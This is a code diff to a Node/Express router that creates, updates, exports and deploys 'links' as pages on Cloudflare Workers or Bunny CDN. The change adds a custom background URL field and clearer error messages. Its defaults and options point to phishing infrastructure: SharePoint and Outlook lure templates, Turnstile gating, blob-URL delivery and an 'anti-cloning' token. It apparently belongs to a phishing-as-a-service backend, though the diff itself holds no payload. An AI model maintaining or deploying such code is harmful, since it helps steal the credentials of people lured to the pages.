@@ -108,6 +108,7 @@ router.post('/', userAuth, async (req, res) => {
       destination_url, custom_domain, url_type, domain_connection, route_name,
       file_name, pages, title_text, message_text, button_text,
       background_blur, blob_url_enabled, copy_to_open, turnstile_enabled,
+      custom_bg_url,
     } = req.body;
 
     // If deploying to Cloudflare Worker, user must have credentials
@@ -119,15 +120,13 @@ router.post('/', userAuth, async (req, res) => {
       }
     }
 
-    // If deploying to Bunny CDN (url_type === 'bunny'), the dedicated endpoint handles it.
-    // For now, just insert the link record.
     const [result] = await db.query(
-      `INSERT INTO links 
+      `INSERT INTO links
        (user_id, name, worker_name, template_type, verification_design, auth_mode,
         destination_url, custom_domain, url_type, domain_connection, route_name,
         file_name, pages, title_text, message_text, button_text,
-        background_blur, blob_url_enabled, copy_to_open, turnstile_enabled)
-       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+        background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
       [
         req.user.id, name || 'Untitled', worker_name, template_type || 'sharepoint3',
         verification_design || 'outlook', auth_mode || 'token',
@@ -136,12 +135,13 @@ router.post('/', userAuth, async (req, res) => {
         file_name || null, pages || null, title_text || null, message_text || null,
         button_text || null, background_blur || 4, blob_url_enabled ? 1 : 0,
         copy_to_open ? 1 : 0, turnstile_enabled !== false ? 1 : 0,
+        custom_bg_url || null,
       ]
     );
 
     const linkId = result.insertId;
 
-    // Generate JWT for anti‑cloning
+    // Generate JWT for anti-cloning
     const jwtPayload = jwt.sign(
       { user_id: req.user.id, link_id: linkId },
       config.JWT_SECRET,
@@ -155,7 +155,7 @@ router.post('/', userAuth, async (req, res) => {
         const templateLoader = require('../services/templateloader');
         const cloudflare = require('../services/cloudflare');
         const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
-        const scriptContent = await templateLoader.buildWorkerScript({ ...req.body, id: linkId }, req.user, apiBaseUrl);
+        const scriptContent = await templateLoader.buildWorkerScript({ ...req.body, id: linkId, custom_bg_url: custom_bg_url || null }, req.user, apiBaseUrl);
         const deployment = await cloudflare.deployWorker(
           scriptContent,
           worker_name,
@@ -167,11 +167,20 @@ router.post('/', userAuth, async (req, res) => {
             routeName: route_name,
           }
         );
-        await db.query('UPDATE links SET worker_name = ?, url_type = ?, custom_domain = ? WHERE id = ?', [deployment.workerName || worker_name, url_type, custom_domain || null, linkId]);
+        await db.query('UPDATE links SET worker_name = ?, url_type = ?, custom_domain = ?, custom_bg_url = ? WHERE id = ?', [deployment.workerName || worker_name, url_type, custom_domain || null, custom_bg_url || null, linkId]);
       } catch (deployErr) {
         await db.query('UPDATE links SET status = ? WHERE id = ?', ['disabled', linkId]);
         console.error('[Links] Worker deployment failed:', deployErr.response?.data || deployErr.message);
-        return res.status(500).json({ error: 'Worker deployment failed: ' + (deployErr.response?.data?.errors?.[0]?.message || deployErr.message) });
+        // Safe error handling for various error formats
+        let errorMessage = 'Worker deployment failed';
+        if (deployErr.response?.data?.errors?.[0]?.message) {
+          errorMessage += ': ' + deployErr.response.data.errors[0].message;
+        } else if (deployErr.message) {
+          errorMessage += ': ' + deployErr.message;
+        } else {
+          errorMessage += ': Unknown error';
+        }
+        return res.status(500).json({ error: errorMessage });
       }
     }
 
@@ -197,6 +206,7 @@ router.put('/:id', userAuth, async (req, res) => {
       'destination_url', 'custom_domain', 'url_type', 'domain_connection', 'route_name',
       'file_name', 'pages', 'title_text', 'message_text', 'button_text',
       'background_blur', 'blob_url_enabled', 'copy_to_open', 'turnstile_enabled', 'status',
+      'custom_bg_url',
     ];
 
     const updates = {};
@@ -266,7 +276,6 @@ router.post('/:id/toggle', userAuth, async (req, res) => {
 // -------------------------------------------
 // Export HTML
 // Accepts either a per-link JWT (in Authorization header or ?token=) OR a valid user session token.
-// This allows deployed workers (which embed the link JWT) to request the export without a user session.
 // -------------------------------------------
 router.get('/:id/export', async (req, res) => {
   try {
@@ -278,11 +287,9 @@ router.get('/:id/export', async (req, res) => {
     let user = null;
     let link = null;
 
-    // If a candidate token exists, try to verify it. It may be either a link JWT or a user JWT.
     if (candidateToken) {
       try {
         const decoded = jwt.verify(candidateToken, config.JWT_SECRET);
-        // If token has link_id, treat as link token
         if (decoded.link_id && decoded.link_id === linkId) {
           const [links] = await db.query('SELECT * FROM links WHERE id = ?', [linkId]);
           if (!links.length) return res.status(404).json({ error: 'Link not found' });
@@ -291,7 +298,6 @@ router.get('/:id/export', async (req, res) => {
           if (!users.length) return res.status(403).json({ error: 'Link owner not found' });
           user = users[0];
         } else if (decoded.user_id) {
-          // Treat as user session token
           const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
           if (!users.length) return res.status(401).json({ error: 'Authentication required' });
           user = users[0];
@@ -305,7 +311,6 @@ router.get('/:id/export', async (req, res) => {
         return res.status(401).json({ error: 'Invalid or expired token' });
       }
     } else {
-      // No token provided — require normal user session via cookie or header
       const sessionToken = req.cookies?.vg_session || null;
       const bearer = req.headers.authorization?.replace('Bearer ', '') || null;
       const fallbackToken = bearer || sessionToken;
@@ -323,9 +328,7 @@ router.get('/:id/export', async (req, res) => {
       }
     }
 
-    // At this point we have both `link` and `user` objects
     const templateLoader = require('../services/templateloader');
-    // Optional domain for Turnstile site-key selection (hosting domain).
     const exportDomain = req.query.domain || req.body?.domain || req.headers['x-export-domain'] || null;
     const html = await templateLoader.generateExportHtml(link, user, { domain: exportDomain });
 
@@ -353,7 +356,7 @@ router.post('/:id/deploy-bunny', userAuth, async (req, res) => {
     }
 
     const templateLoader = require('../services/templateloader');
-    const html = await templateLoader.generateExportHtml(link, req.user);
+    const html = await templateLoader.generateExportHtml(link, req.user, {});
 
     const bunny = require('../services/bunny');
     const fileName = `vg-${link.worker_name || link.id}.html`;
@@ -371,7 +374,7 @@ router.post('/:id/deploy-bunny', userAuth, async (req, res) => {
 
     res.json({ url: result.url });
   } catch (err) {
-    res.status(500).json({ error: err.message });
+    res.status(500).json({ error: err.message || 'Deployment failed' });
   }
 });
 
